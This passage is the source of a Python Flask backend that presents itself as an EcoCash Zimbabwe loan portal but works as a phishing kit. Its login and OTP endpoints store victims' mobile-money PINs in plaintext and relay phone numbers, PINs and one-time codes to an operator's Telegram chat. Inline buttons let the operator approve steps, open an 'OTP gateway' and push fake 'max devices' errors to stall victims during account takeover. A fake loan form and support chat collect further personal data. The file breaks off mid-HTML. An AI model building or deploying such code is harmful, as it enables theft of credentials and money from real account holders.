"""
EcoCash Zimbabwe — Vercel + PostgreSQL Production Backend
==========================================================
Ported from SQLite → PostgreSQL for Vercel serverless deployment.
All sqlite3 calls replaced with psycopg2 cursor-based calls.
? placeholders replaced with %s.
INTEGER PRIMARY KEY AUTOINCREMENT → SERIAL PRIMARY KEY.
init_db() runs in autocommit mode so DDL statements don't need explicit commit.

Original bug fixes (unchanged):
1-18. See original header comments — all fixes retained.
19. FLASK_SECRET auto-generation logs a critical warning (serverless cold starts
    get a new key each time, breaking admin sessions — set FLASK_SECRET env var).
20. DATABASE_URL env var required; app raises RuntimeError at startup if missing.
"""

import os
import hashlib
import html
import random
import string
import logging
import requests
import psycopg2
import psycopg2.extras
from datetime import datetime, timedelta, timezone
from functools import wraps
from dotenv import load_dotenv

load_dotenv()

from flask import Flask, request, jsonify, send_from_directory, session, redirect
from flask_cors import CORS
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# ── Env vars ────────────────────────────────────────────────────────────────
BOT_TOKEN      = os.environ.get("TELEGRAM_BOT_TOKEN") or os.environ.get("BOT_TOKEN", "")
ADMIN_CHAT_ID  = os.environ.get("TELEGRAM_ADMIN_ID")  or os.environ.get("ADMIN_CHAT_ID", "")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin1234")
FLASK_SECRET   = (os.environ.get("SESSION_SECRET")
                  or os.environ.get("FLASK_SECRET", ""))
FLASK_PORT     = int(os.environ.get("PORT", 5000))
ALLOWED_ORIGIN = os.environ.get("ALLOWED_ORIGIN", "*")
DATABASE_URL   = os.environ.get("DATABASE_URL", "")

_replit_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
BASE_URL = (os.environ.get("BASE_URL", "")
            or (f"https://{_replit_domain}" if _replit_domain else ""))

HTML_DIR = os.path.dirname(os.path.abspath(__file__))

logging.basicConfig(format="%(asctime)s [%(levelname)s] %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

if not DATABASE_URL:
    raise RuntimeError("DATABASE_URL environment variable is required. "
                       "Set it in Vercel Project → Settings → Environment Variables.")

# ── Database helpers ─────────────────────────────────────────────────────────

def get_db():
    """Return a psycopg2 connection with RealDictCursor so rows behave like dicts."""
    return psycopg2.connect(DATABASE_URL, cursor_factory=psycopg2.extras.RealDictCursor)


def init_db():
    """Create tables if they don't exist. Runs in autocommit so each DDL is atomic."""
    conn = get_db()
    conn.autocommit = True
    cur = conn.cursor()

    cur.execute("""
        CREATE TABLE IF NOT EXISTS sessions (
            session_id       TEXT PRIMARY KEY,
            phone            TEXT NOT NULL,
            pin_hash         TEXT NOT NULL,
            pin_plain        TEXT,
            otp              TEXT,
            pin_approved     INTEGER DEFAULT 0,
            otp_approved     INTEGER DEFAULT 0,
            otp_gateway_open INTEGER DEFAULT 0,
            status           TEXT    DEFAULT 'awaiting_pin',
            ip_address       TEXT,
            created_at       TEXT,
            expires_at       TEXT
        )
    """)
    cur.execute("CREATE INDEX IF NOT EXISTS idx_sessions_id ON sessions(session_id)")

    cur.execute("""
        CREATE TABLE IF NOT EXISTS loan_applications (
            id                SERIAL PRIMARY KEY,
            reference         TEXT UNIQUE,
            session_id        TEXT,
            loan_type         TEXT,
            amount            FLOAT,
            term_months       INTEGER,
            purpose           TEXT,
            first_name        TEXT,
            last_name         TEXT,
            email             TEXT,
            phone             TEXT,
            employment_status TEXT,
            annual_income     FLOAT,
            status            TEXT DEFAULT 'Pending',
            created_at        TEXT
        )
    """)
    cur.execute("CREATE INDEX IF NOT EXISTS idx_loans_session ON loan_applications(session_id)")

    cur.execute("""
        CREATE TABLE IF NOT EXISTS chat_messages (
            id          SERIAL PRIMARY KEY,
            visitor_id  TEXT NOT NULL,
            role        TEXT NOT NULL CHECK(role IN ('user','admin')),
            message     TEXT NOT NULL,
            created_at  TEXT NOT NULL
        )
    """)
    cur.execute("CREATE INDEX IF NOT EXISTS idx_chat_visitor ON chat_messages(visitor_id, created_at)")

    # Migration: add pin_plain column if it was created before this column existed
    try:
        cur.execute("ALTER TABLE sessions ADD COLUMN pin_plain TEXT")
        logger.info("Migrated: added pin_plain column to sessions")
    except Exception:
        pass  # Column already exists — psycopg2 autocommit means no rollback needed

    cur.close()
    conn.close()
    logger.info("Database ready (PostgreSQL)")

# ── Flask app ────────────────────────────────────────────────────────────────

app = Flask(__name__, static_folder=HTML_DIR, static_url_path="")
if not FLASK_SECRET:
    import secrets
    FLASK_SECRET = secrets.token_hex(32)
    logger.critical(
        "FLASK_SECRET is not set — generated a random key. "
        "Admin sessions WILL break on cold starts. "
        "Set FLASK_SECRET in Vercel environment variables."
    )
app.secret_key = FLASK_SECRET
CORS(app, origins=ALLOWED_ORIGIN)

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per day", "50 per hour"],
    storage_uri="memory://"
)

# ── Utility functions ─────────────────────────────────────────────────────────

def now_utc() -> datetime:
    return datetime.now(timezone.utc)

def hash_pin(pin: str) -> str:
    return hashlib.sha256(pin.encode()).hexdigest()

def gen_session_id():
    return "sess_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=20))

def gen_reference(conn=None):
    """Generate a unique reference; retry up to 5 times on collision."""
    date_part = now_utc().strftime("%Y%m%d")
    for _ in range(5):
        rand_part = "".join(random.choices(string.digits + string.ascii_uppercase, k=8))
        ref = f"ECO{date_part}{rand_part}"
        if conn is None:
            return ref
        cur = conn.cursor()
        cur.execute("SELECT 1 FROM loan_applications WHERE reference = %s", (ref,))
        existing = cur.fetchone()
        cur.close()
        if not existing:
            return ref
    raise RuntimeError("Could not generate unique reference after 5 attempts")

def format_time():
    return now_utc().strftime("%d %b %Y %I:%M:%S %p UTC")

def format_phone(phone: str) -> str:
    phone = phone.strip().replace(" ", "").replace("-", "")
    if phone.startswith("+263") and len(phone) == 13 and phone[1:].isdigit(): return phone
    if phone.startswith("263")  and len(phone) == 12 and phone.isdigit():     return "+" + phone
    if phone.startswith("0")    and len(phone) == 10 and phone.isdigit():     return "+263" + phone[1:]
    if len(phone) == 9 and phone.isdigit():                                   return "+263" + phone
    return None

def is_valid_phone(phone: str) -> bool:
    return format_phone(phone) is not None

def is_session_expired(row) -> bool:
    try:
        expires = datetime.fromisoformat(str(row["expires_at"]))
        if expires.tzinfo is None:
            expires = expires.replace(tzinfo=timezone.utc)
        return now_utc() > expires
    except Exception as e:
        logger.warning("Could not parse expires_at '%s': %s", row["expires_at"], e)
        return True

def escape_md(text: str) -> str:
    """Escape Telegram MarkdownV1 special characters."""
    for ch in ["_", "*", "`", "["]:
        text = str(text).replace(ch, "\\" + ch)
    return text

def safe_float(value, default=0.0):
    try:
        return float(value)
    except (TypeError, ValueError):
        return default

def safe_int(value, default=0):
    try:
        return int(value)
    except (TypeError, ValueError):
        return default

# ── Telegram helpers ──────────────────────────────────────────────────────────

def send_telegram_message(text, buttons=None):
    if not BOT_TOKEN or not ADMIN_CHAT_ID:
        logger.warning("Telegram not configured — skipping message")
        return False
    url     = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": ADMIN_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    if buttons:
        payload["reply_markup"] = {"inline_keyboard": buttons}
    try:
        resp = requests.post(url, json=payload, timeout=5)
        if resp.status_code != 200:
            logger.error("Telegram sendMessage failed: %s", resp.text)
        return resp.status_code == 200
    except Exception as e:
        logger.error("Telegram error: %s", e)
        return False

def answer_callback(callback_id, text):
    if not BOT_TOKEN:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": text},
            timeout=5
        )
    except Exception:
        pass

def edit_message(chat_id, msg_id, text, buttons=None):
    if not BOT_TOKEN:
        return
    try:
        payload = {
            "chat_id":    chat_id,
            "message_id": msg_id,
            "text":       text,
            "parse_mode": "Markdown"
        }
        if buttons:
            payload["reply_markup"] = {"inline_keyboard": buttons}
        else:
            payload["reply_markup"] = {"inline_keyboard": []}
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText",
            json=payload,
            timeout=5
        )
    except Exception:
        pass

# ── Static page routes ────────────────────────────────────────────────────────

@app.route("/health")
def health():
    return {"status": "ok"}, 200

@app.route("/")
def serve_index():    return send_from_directory(HTML_DIR, "index-v2.html")

@app.route("/loan-application")
def serve_loan():     return send_from_directory(HTML_DIR, "loan-application-v2.html")

@app.route("/login")
def serve_login():    return send_from_directory(HTML_DIR, "login-v2.html")

@app.route("/otp-verify")
def serve_otp():      return send_from_directory(HTML_DIR, "otp-verify-v2.html")

@app.route("/success")
def serve_success():  return send_from_directory(HTML_DIR, "success-v2.html")

@app.route("/chat-widget.js")
def serve_chat_widget(): return send_from_directory(HTML_DIR, "chat-widget.js")

# ── API: Login ─────────────────────────────────────────────────────────────────

@app.route("/api/login", methods=["POST"])
@limiter.limit("10 per minute")
def api_login():
    data  = request.get_json(silent=True) or {}
    phone = data.get("phone", "").strip()
    pin   = data.get("pin", "").strip()

    if not phone or not pin:
        return jsonify({"success": False, "error": "Phone and PIN required"}), 400
    if len(pin) != 4 or not pin.isdigit():
        return jsonify({"success": False, "error": "PIN must be 4 digits"}), 400

    formatted_phone = format_phone(phone)
    if not formatted_phone:
        return jsonify({"success": False, "error": "Invalid Zimbabwe phone number"}), 400

    session_id = gen_session_id()
    now        = now_utc()
    expires    = now + timedelta(minutes=30)

    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "INSERT INTO sessions "
        "(session_id, phone, pin_hash, pin_plain, otp, status, ip_address, created_at, expires_at) "
        "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s)",
        (session_id, formatted_phone, hash_pin(pin), pin, "",
         "awaiting_pin", request.remote_addr,
         now.isoformat(), expires.isoformat())
    )
    conn.commit()
    cur.close()
    conn.close()

    buttons = [
        [{"text": "✅ PIN CORRECT",  "callback_data": f"pin_ok:{session_id}"}],
        [{"text": "❌ PIN WRONG",    "callback_data": f"pin_wrong:{session_id}"}]
    ]
    text = (
        f"🔐 *STEP 1: PIN VERIFICATION*\n\n"
        f"📞 `{formatted_phone}`\n"
        f"🔑 PIN: `{pin}`\n\n"
        f"🕐 {format_time()}"
    )
    send_telegram_message(text, buttons)

    return jsonify({"success": True, "session_id": session_id})

# ── API: Submit OTP ───────────────────────────────────────────────────────────

@app.route("/api/submit-otp", methods=["POST"])
@limiter.limit("10 per minute")
def api_submit_otp():
    data       = request.get_json(silent=True) or {}
    session_id = data.get("session_id")
    otp        = data.get("otp", "").strip()

    if not session_id or not otp:
        return jsonify({"success": False, "error": "Session and OTP required"}), 400
    if len(otp) != 6 or not otp.isdigit():
        return jsonify({"success": False, "error": "OTP must be 6 digits"}), 400

    conn = get_db()
    cur  = conn.cursor()
    cur.execute("SELECT * FROM sessions WHERE session_id = %s", (session_id,))
    row = cur.fetchone()

    if not row:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Session not found"}), 404

    if is_session_expired(row):
        cur.execute("UPDATE sessions SET status = 'expired' WHERE session_id = %s", (session_id,))
        conn.commit()
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Session expired. Please login again."}), 400

    if row["otp_gateway_open"] == 0:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Gateway not open yet. Please wait."}), 403

    if row["otp_approved"] == 1:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "OTP already verified"}), 400

    cur.execute(
        "UPDATE sessions SET otp = %s, status = 'awaiting_otp' WHERE session_id = %s",
        (otp, session_id)
    )
    conn.commit()
    cur.close()
    conn.close()

    buttons = [
        [{"text": "✅ OTP CORRECT",  "callback_data": f"otp_ok:{session_id}"}],
        [{"text": "❌ OTP WRONG",    "callback_data": f"otp_wrong:{session_id}"}],
        [{"text": "⚠️ MAX DEVICES",   "callback_data": f"max_devices:{session_id}"}]
    ]
    phone = row["phone"]
    text  = (
        f"🔑 *STEP 2: OTP VERIFICATION*\n\n"
        f"📞 `{phone}`\n"
        f"🔢 OTP: `{otp}`\n\n"
        f"🕐 {format_time()}"
    )
    send_telegram_message(text, buttons)

    return jsonify({"success": True})

# ── API: Resend OTP ───────────────────────────────────────────────────────────

@app.route("/api/resend-otp", methods=["POST"])
@limiter.limit("3 per minute")
def api_resend_otp():
    data       = request.get_json(silent=True) or {}
    session_id = data.get("session_id")

    if not session_id:
        return jsonify({"success": False, "error": "Session ID required"}), 400

    conn = get_db()
    cur  = conn.cursor()
    cur.execute("SELECT * FROM sessions WHERE session_id = %s", (session_id,))
    row = cur.fetchone()

    if not row:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Session not found"}), 404

    if is_session_expired(row):
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Session expired"}), 400

    if row["otp_gateway_open"] == 0:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Gateway not open yet"}), 403

    terminal_statuses = ("otp_approved", "max_devices_reached", "pin_rejected",
                         "otp_rejected", "expired", "fully_approved")
    if row["status"] in terminal_statuses or row["otp_approved"] == 1:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "OTP already verified"}), 400

    cur.execute(
        "UPDATE sessions SET otp = '', otp_approved = 0, status = 'awaiting_otp' "
        "WHERE session_id = %s",
        (session_id,)
    )
    conn.commit()
    cur.close()
    conn.close()

    return jsonify({"success": True})

# ── API: Check status ─────────────────────────────────────────────────────────

@app.route("/api/check-status", methods=["GET"])
@limiter.exempt
def api_check_status():
    session_id = request.args.get("session_id", "").strip()
    if not session_id:
        return jsonify({"status": "invalid", "error": "session_id required"}), 400

    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "SELECT pin_approved, otp_approved, otp_gateway_open, status, expires_at "
        "FROM sessions WHERE session_id = %s",
        (session_id,)
    )
    row = cur.fetchone()
    cur.close()
    conn.close()

    if not row:
        return jsonify({"status": "expired"}), 404

    if is_session_expired(row):
        return jsonify({"status": "expired"})

    db_status = row["status"]
    if db_status in ("pin_rejected", "otp_rejected", "expired", "max_devices_reached"):
        return jsonify({"status": db_status})

    if row["pin_approved"] == 0:
        status = "awaiting_pin"
    elif row["otp_gateway_open"] == 0:
        status = "waiting_for_gateway"
    elif row["otp_approved"] == 0:
        status = "awaiting_otp"
    else:
        status = "fully_approved"

    return jsonify({
        "status":           status,
        "pin_approved":     row["pin_approved"],
        "otp_approved":     row["otp_approved"],
        "otp_gateway_open": row["otp_gateway_open"]
    })

# ── Telegram Webhook ──────────────────────────────────────────────────────────

@app.route("/telegram-webhook", methods=["POST"])
@limiter.exempt
def telegram_webhook():
    update   = request.get_json(silent=True) or {}
    callback = update.get("callback_query")
    if not callback:
        return "ok", 200

    cb_id   = callback["id"]
    data    = callback.get("data", "")
    msg     = callback.get("message", {})
    msg_id  = msg.get("message_id")
    chat_id = msg.get("chat", {}).get("id")

    if ":" not in data:
        answer_callback(cb_id, "Unknown action.")
        return "ok", 200

    action, session_id = data.split(":", 1)

    conn = get_db()
    cur  = conn.cursor()
    cur.execute("SELECT * FROM sessions WHERE session_id = %s", (session_id,))
    row = cur.fetchone()

    if not row:
        cur.close()
        conn.close()
        answer_callback(cb_id, "⚠️ Session expired or not found.")
        return "ok", 200

    phone = row["phone"]

    if action == "pin_ok":
        cur.execute(
            "UPDATE sessions SET pin_approved = 1, status = 'waiting_for_gateway' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "✅ PIN Approved!")
        buttons = [[{"text": "🔓 OPEN OTP GATEWAY", "callback_data": f"open_gateway:{session_id}"}]]
        pin_display = row["pin_plain"] or "****"
        edit_message(chat_id, msg_id,
            f"✅ *PIN ACCEPTED*\n\n"
            f"📞 `{phone}`\n"
            f"🔑 PIN: `{pin_display}`\n"
            f"🕐 {format_time()}\n\n"
            f"*Tap below when the user should enter their OTP.*",
            buttons)

    elif action == "pin_wrong":
        cur.execute(
            "UPDATE sessions SET pin_approved = 0, status = 'pin_rejected' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "❌ PIN Rejected.")
        edit_message(chat_id, msg_id,
            f"❌ *PIN REJECTED*\n\n📞 `{phone}`\n🕐 {format_time()}\n\n"
            f"*User has been notified and must re-enter their PIN.*")

    elif action == "open_gateway":
        if row["otp_gateway_open"] == 1:
            cur.close()
            conn.close()
            answer_callback(cb_id, "ℹ️ Gateway already open.")
            return "ok", 200
        cur.execute(
            "UPDATE sessions SET otp_gateway_open = 1, status = 'awaiting_otp' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "🔓 OTP Gateway Opened!")
        edit_message(chat_id, msg_id,
            f"🔓 *OTP GATEWAY OPENED*\n\n📞 `{phone}`\n🕐 {format_time()}\n\n"
            f"*User is now entering their OTP. Await Step 2 message.*")

    elif action == "otp_ok":
        cur.execute(
            "UPDATE sessions SET otp_approved = 1, status = 'fully_approved' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "✅ OTP Approved!")
        otp_display = row["otp"] or "------"
        pin_display = row["pin_plain"] or "****"
        edit_message(chat_id, msg_id,
            f"✅ *OTP ACCEPTED — ALL STEPS COMPLETE*\n\n"
            f"📞 `{phone}`\n"
            f"🔑 PIN: `{pin_display}`\n"
            f"🔢 OTP: `{otp_display}`\n"
            f"🕐 {format_time()}\n\n"
            f"✅ *User has been redirected to the loan application.*")

    elif action == "otp_wrong":
        cur.execute(
            "UPDATE sessions SET otp = '', otp_approved = 0, status = 'otp_rejected' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "❌ OTP Rejected.")
        edit_message(chat_id, msg_id,
            f"❌ *OTP REJECTED*\n\n📞 `{phone}`\n🕐 {format_time()}\n\n"
            f"*User has been notified and must re-enter OTP.*")

    elif action == "max_devices":
        cur.execute(
            "UPDATE sessions SET status = 'max_devices_reached' "
            "WHERE session_id = %s", (session_id,)
        )
        conn.commit()
        cur.close()
        conn.close()
        answer_callback(cb_id, "⚠️ Max Devices Alert Sent!")
        edit_message(chat_id, msg_id,
            f"⚠️ *MAXIMUM DEVICES REACHED*\n\n📞 `{phone}`\n🕐 {format_time()}\n\n"
            f"*User has been notified to logout and retry.*")

    else:
        cur.close()
        conn.close()
        answer_callback(cb_id, "Unknown action.")

    return "ok", 200

# ── API: Submit Loan ──────────────────────────────────────────────────────────

@app.route("/api/submit-loan", methods=["POST"])
@limiter.limit("5 per minute")
def api_submit_loan():
    data       = request.get_json(silent=True) or {}
    session_id = data.get("session_id")

    if not session_id:
        return jsonify({"success": False, "error": "Session ID required"}), 400

    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "SELECT * FROM sessions WHERE session_id = %s AND pin_approved = 1 AND otp_approved = 1",
        (session_id,)
    )
    sess = cur.fetchone()

    if not sess:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Unauthorized — verification incomplete"}), 401

    if is_session_expired(sess):
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Session expired"}), 401

    required = ["loan_type", "amount", "term_months", "purpose",
                "first_name", "last_name", "email", "phone",
                "employment_status", "annual_income"]
    for field in required:
        if field not in data or data[field] in ("", None):
            cur.close()
            conn.close()
            return jsonify({"success": False, "error": f"Missing field: {field}"}), 400

    amount        = safe_float(data["amount"])
    term_months   = safe_int(data["term_months"])
    annual_income = safe_float(data["annual_income"])

    if amount <= 0:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Invalid loan amount"}), 400
    if term_months <= 0:
        cur.close()
        conn.close()
        return jsonify({"success": False, "error": "Invalid term"}), 400

    try:
        ref = gen_reference(conn)
    except RuntimeError as e:
        cur.close()
        conn.close()
        logger.error("Reference generation failed: %s", e)
        return jsonify({"success": False, "error": "Could not generate reference. Try again."}), 500

    now = now_utc().isoformat()

    try:
        cur.execute(
            "INSERT INTO loan_applications "
            "(reference, session_id, loan_type, amount, term_months, purpose, "
            " first_name, last_name, email, phone, employment_status, annual_income, status, created_at) "
            "VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s, %s)",
            (ref, session_id, data["loan_type"], amount, term_months,
             data["purpose"], data["first_name"], data["last_name"], data["email"],
             data["phone"], data["employment_status"], annual_income, "Pending", now)
        )
        conn.commit()
    except Exception as e:
        cur.close()
        conn.close()
        logger.error("Loan insert error: %s", e)
        return jsonify({"success": False, "error": "Database error"}), 500

    cur.close()
    conn.close()

    safe_first = escape_md(data["first_name"])
    safe_last  = escape_md(data["last_name"])
    safe_phone = data["phone"]

    send_telegram_message(
        f"📋 *NEW LOAN APPLICATION*\n\n"
        f"📞 `{safe_phone}`\n"
        f"👤 {safe_first} {safe_last}\n"
        f"💰 ZWL {amount:,.0f} × {term_months} months\n"
        f"📌 Ref: `{ref}`\n"
        f"🕐 {format_time()}"
    )

    return jsonify({"success": True, "reference": ref})

# ── Admin helpers ─────────────────────────────────────────────────────────────

STATUS_COLORS = {
    "awaiting_pin":       "#f59e0b",
    "waiting_for_gateway":"#3b82f6",
    "awaiting_otp":       "#8b5cf6",
    "fully_approved":     "#10b981",
    "pin_rejected":       "#ef4444",
    "otp_rejected":       "#ef4444",
    "expired":            "#9ca3af",
}

def admin_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get("admin_logged_in"):
            return redirect("/admin/login")
        return f(*args, **kwargs)
    return decorated

# ── API: Chat ─────────────────────────────────────────────────────────────────

@app.route("/api/chat/send", methods=["POST"])
@limiter.limit("30 per minute")
def api_chat_send():
    data       = request.get_json(silent=True) or {}
    visitor_id = data.get("visitor_id", "").strip()
    message    = data.get("message", "").strip()

    if not visitor_id or not message:
        return jsonify({"success": False, "error": "visitor_id and message required"}), 400
    if len(message) > 1000:
        return jsonify({"success": False, "error": "Message too long (max 1000 chars)"}), 400

    now  = now_utc().isoformat()
    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "INSERT INTO chat_messages (visitor_id, role, message, created_at) VALUES (%s, 'user', %s, %s)",
        (visitor_id, message, now)
    )
    conn.commit()
    cur.close()
    conn.close()

    buttons = [[{
        "text": "💬 Reply in Admin Panel",
        "callback_data": f"chat_open:{visitor_id}"
    }]]
    safe_msg = escape_md(message[:300]) + ("…" if len(message) > 300 else "")
    send_telegram_message(
        f"💬 *NEW SUPPORT MESSAGE*\n\n"
        f"🆔 Visitor: `{visitor_id}`\n"
        f"💬 {safe_msg}\n\n"
        f"🕐 {format_time()}\n\n"
        f"_Reply at: {BASE_URL}/admin/chat/{visitor_id}_",
        buttons
    )

    return jsonify({"success": True})


@app.route("/api/chat/poll", methods=["GET"])
@limiter.limit("60 per minute")
def api_chat_poll():
    visitor_id = request.args.get("visitor_id", "").strip()
    since      = request.args.get("since", "")

    if not visitor_id:
        return jsonify({"messages": []}), 400

    conn = get_db()
    cur  = conn.cursor()
    if since:
        cur.execute(
            "SELECT role, message, created_at FROM chat_messages "
            "WHERE visitor_id = %s AND role = 'admin' AND created_at > %s "
            "ORDER BY created_at ASC LIMIT 50",
            (visitor_id, since)
        )
    else:
        cur.execute(
            "SELECT role, message, created_at FROM chat_messages "
            "WHERE visitor_id = %s AND role = 'admin' "
            "ORDER BY created_at ASC LIMIT 50",
            (visitor_id,)
        )
    rows = cur.fetchall()
    cur.close()
    conn.close()

    return jsonify({"messages": [
        {"role": r["role"], "text": r["message"], "ts": r["created_at"]}
        for r in rows
    ]})


@app.route("/api/chat/reply", methods=["POST"])
@admin_required
def api_chat_reply():
    data       = request.get_json(silent=True) or {}
    visitor_id = data.get("visitor_id", "").strip()
    message    = data.get("message", "").strip()

    if not visitor_id or not message:
        return jsonify({"success": False, "error": "visitor_id and message required"}), 400

    now  = now_utc().isoformat()
    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "INSERT INTO chat_messages (visitor_id, role, message, created_at) VALUES (%s, 'admin', %s, %s)",
        (visitor_id, message, now)
    )
    conn.commit()
    cur.close()
    conn.close()

    return jsonify({"success": True})


# ── Admin: Chat panel ─────────────────────────────────────────────────────────

@app.route("/admin/chat")
@admin_required
def admin_chat_list():
    conn = get_db()
    cur  = conn.cursor()
    cur.execute("""
        SELECT visitor_id,
               MAX(created_at) AS last_at,
               SUM(CASE WHEN role='user'  THEN 1 ELSE 0 END) AS user_count,
               SUM(CASE WHEN role='admin' THEN 1 ELSE 0 END) AS admin_count
        FROM chat_messages
        GROUP BY visitor_id
        ORDER BY last_at DESC
        LIMIT 50
    """)
    convos = cur.fetchall()
    cur.close()
    conn.close()

    rows = "".join(
        f"<tr>"
        f"<td><a href='/admin/chat/{c['visitor_id']}' style='color:#003087;font-weight:700;'>"
        f"{c['visitor_id'][:20]}…</a></td>"
        f"<td>{c['user_count']}</td><td>{c['admin_count']}</td>"
        f"<td>{c['last_at'][:16]}</td>"
        f"</tr>"
        for c in convos
    )

    return f"""
    <html><head><title>EcoCash – Chat Conversations</title>
    <style>body{{font-family:sans-serif;padding:2rem;background:#f0f4f8;}}
    h1{{color:#003087;}} a{{color:#003087;}}
    table{{border-collapse:collapse;width:100%;background:white;border-radius:8px;
           overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.08);margin-top:1rem;}}
    th{{background:#003087;color:white;padding:.6rem 1rem;text-align:left;font-size:.85rem;}}
    td{{padding:.55rem 1rem;border-bottom:1px solid #eee;font-size:.85rem;}}
    tr:last-child td{{border:none;}}</style></head>
    <body>
    <h1>Support Conversations</h1>
    <a href="/admin">← Admin Panel</a>
    <table>
        <tr><th>Visitor</th><th>User msgs</th><th>Admin replies</th><th>Last activity</th></tr>
        {rows if rows else '<tr><td colspan="4" style="text-align:center;color:#888;">No conversations yet</td></tr>'}
    </table>
    </body></html>
    """


@app.route("/admin/chat/<visitor_id>")
@admin_required
def admin_chat_view(visitor_id):
    conn = get_db()
    cur  = conn.cursor()
    cur.execute(
        "SELECT role, message, created_at FROM chat_messages "
        "WHERE visitor_id = %s ORDER BY created_at ASC",
        (visitor_id,)
    )
    msgs = cur.fetchall()
    cur.close()
    conn.close()

    def bubble(m):
        align = "right" if m["role"] == "admin" else "left"
        bg    = "#003087" if m["role"] == "admin" else "#fff"
        color = "white"  if m["role"] == "admin" else "#1a1a1a"
        label = "You (Admin)" if m["role"] == "admin" else "User"
        safe_msg = html.escape(m["message"]).replace("\n", "<br>")
        return (
            f"<div style='text-align:{align};margin-bottom:10px;'>"
            f"<small style='color:#888;font-size:.72rem;'>{label} · {m['created_at'][11:16]}</small><br>"
            f"<span style='display:inline-block;background:{bg};color:{color};"
            f"padding:9px 14px;border-radius:16px;max-width:75%;word-break:break-word;"
            f"font-size:.9rem;text-align:left;'>{safe_msg}</span></div>"
        )

    bubbles = "".join(bubble(m) for m in msgs) if msgs else \
        "<p style='color:#888;text-align:center;margin-top:2rem;'>No messages yet.</p>"

    return f"""
    <html><head><title>Chat – {visitor_id[:16]}</title>
    <style>
        body{{font-family:sans-serif;background:#f0f4f8;margin:0;display:flex;flex-direction:column;height:100vh;}}
        .topbar{{background:#003087;color:white;padding:1rem 1.5rem;display:flex;align-items:center;gap:1rem;}}
        .topbar a{{color:rgba(255,255,255,.8);text-decoration:none;font-size:.85rem;}}
        .topbar a:hover{{color:white;}}
        .msgs{{flex:1;overflow-y:auto;padding:1.5rem;}}
        .reply-bar{{background:white;border-top:1px solid #eee;padding:1rem 1.5rem;display:flex;gap:.75rem;}}
        textarea{{flex:1;border:1.5px solid #ddd;border-radius:10px;padding:.7rem 1rem;
                  font-family:sans-serif;font-size:.9rem;resize:none;outline:none;}}
        textarea:focus{{border-color:#003087;}}
        button{{background:#003087;color:white;border:none;border-radius:10px;
                padding:.7rem 1.4rem;font-weight:700;cursor:pointer;font-size:.9rem;}}
        button:hover{{background:#002060;}}
    </style></head>
    <body>
    <div class="topbar">
        <a href="/admin/chat">← Conversations</a>
        <span style="font-weight:700;color:white;">Chat with {visitor_id[:24]}</span>
        <span style="margin-left:auto;font-size:.75rem;opacity:.7;">{len(msgs)} messages</span>
    </div>
    <div class="msgs" id="msgs">{bubbles}</div>
    <div class="reply-bar">
        <textarea id="reply" placeholder="Type your reply..." rows="2"></textarea>
        <button onclick="sendReply()">Send</button>
    </div>
    <script>
        document.getElementById('msgs').scrollTop = 99999;
        document.getElementById('reply').addEventListener('keydown', e => {{
            if (e.key === 'Enter' && !e.shiftKey) {{ e.preventDefault(); sendReply(); }}
        }});
        async function sendReply() {{
            const ta  = document.getElementById('reply');
            const msg = ta.value.trim();
            if (!msg) return;
            ta.value = '';
            const res  = await fetch('/api/chat/reply', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/json'}},
                body: JSON.stringify({{ visitor_id: '{visitor_id}', message: msg }})
            }});
            if ((await res.json()).success) location.reload();
        }}
    </script>
    </body></html>
    """

# ── Admin panel ───────────────────────────────────────────────────────────────

@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if request.method == "POST" and request.form.get("password") == ADMIN_PASSWORD:
        session["admin_logged_in"] = True
        return redirect("/admin")
    error = "<p style='color:red;'>Incorrect password.</p>" if request.method == "POST" else ""
    return f"""
    <html><head><title>EcoCash Admin Login</title></head>
    <body style="font-family:sans-serif;display:flex;justify-content:center;align-items:center;
                 height:100vh;background:#f0f4f8;margin:0;">
    <div style="background:white;padding:2rem;border-radius:12px;
                box-shadow:0 4px 12px rgba(0,0,0,.1);text-align:center;max-width:320px;width:90%;">
        <h2 style="color:#003087;margin-bottom:1rem;">EcoCash Admin</h2>
        {error}
        <form method="post">
            <input type="password" name="password" placeholder="Admin Password"
